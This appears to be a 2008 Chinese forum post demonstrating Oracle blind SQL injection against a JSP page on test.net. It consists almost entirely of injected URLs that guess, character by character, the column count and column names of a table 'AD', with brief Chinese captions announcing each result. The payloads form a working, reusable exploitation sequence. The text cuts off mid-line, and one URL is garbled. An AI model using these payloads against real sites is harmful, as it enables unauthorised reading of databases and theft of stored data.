+http://www.test.net/index_kaoyan_view.jsp?id=117 And 102=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 102>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 99=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 99>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 97=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 97>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 53=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 53>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 51=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 51>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 50=ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 50>ascii(substr((SELECT COUNT(*)FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 48=ascii(substr((SELECT COUNT(*) FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68)),2,1))  
+
+
+l 以下为猜解第一列的第一个字段名CLASS的长度为：5  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 0<=nvl(length((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1)),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 1>=nvl(length((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1)),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 2<=nvl(length((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1)),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 4>=nvl(length((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1)),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 5<=nvl(length((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1)),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 9>=nvl(length((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1)),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 7=nvl(length((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1)),0)  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 7>nvl(length((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1)),0)  
+
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 5=nvl(length((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1)),0)  
+
+l 以下为猜解第一列第一个字段的第一位为：C  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 65=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 78=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 78>ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 71=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 71>ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 68=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 68>ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 66=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 66>ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 67=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),1,1))  
+
+l 以下为猜解第一列第一个字段的第一位为:L  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 67=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 79=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 79>ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 73=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),2,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 73>ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),2,1))  
+http://www.test.net/index_kaoyan_view.j, , sp?id=117 And 76=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),2,1))  
+
+l 以下为猜解第一列第一个字段的第三位为：A  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 76=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),3,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 95=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),3,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 83=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),3,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 83>ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),3,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 79=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),3,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 79>ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),3,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 77=ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),3,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 77>ascii(substr((SELECT COLUMN_NAME FROM(SELECT*FROM(SELECT*FROM(SELECT*FROM COLS WHERE TABLE_NAME=CHR(65)||CHR(68) ORDER BY 2ASC)WHERE ROWNUM<=1)ORDER BY 2DESC)WHERE ROWNUM<=1),3,1))  
+http://www.test.net/index_kaoyan_view.jsp?id=117 And 70=ascii(substr((SELECT COLU
+
+[ 本帖最后由 猪哥靓 于 2008-6-18 18:51 编辑 ] 
+ 
+帖子15 精华0 积分1008 阅读权限50 性别男 在线时间22 小时 注册时间2007-3-1 最后登录2008-9-10 查看个人网站
+
+查看详细资料
+ TOP 
+ 
